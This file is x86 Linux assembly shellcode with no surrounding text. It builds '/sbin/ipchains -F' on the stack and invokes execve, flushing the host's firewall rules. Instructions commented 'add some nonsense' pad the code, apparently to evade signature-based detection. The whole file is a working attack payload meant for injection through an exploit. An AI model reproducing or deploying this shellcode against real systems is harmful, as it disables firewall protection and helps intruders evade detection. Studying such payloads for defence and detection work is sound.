
section .text

global _start

_start:
    xor ecx, ecx            ; zero out ecx
    mul ecx                 ; zero out edx and eax
    push byte 10
    pop eax                 ; eax = 10
    push ecx                ; push ecx instead of edx
    push 0x2d               ; "-" char
    mov byte [esp+1], 0x46  ; "F" char
    mov ecx, esp            ; save current stack pointer to ecx
    push edx                ; push null
    push word 0x736e        ; following 4 push instructions form /sbin/ipchains
    push 0x69616863
    push 0x70692f6e
    push 0x6962732f
    push 0xdeadbeef         ; add some nonsense
    pop edi
    mov ebx, esp            ; save currrent stack pointer to ebx
    push edx                ; push null
    push ecx                ; points to "-F"
    push ebx                ; points to /sbin/ipchains
    xor ecx, ecx            ; add some nonsense
    mov edi, esp            ; add some nonsense
    xchg ecx, edi           ; save current stack pointer to ecx
    inc eax                 ; syscall 11: execve()
    int 0x80                ; execute syscall

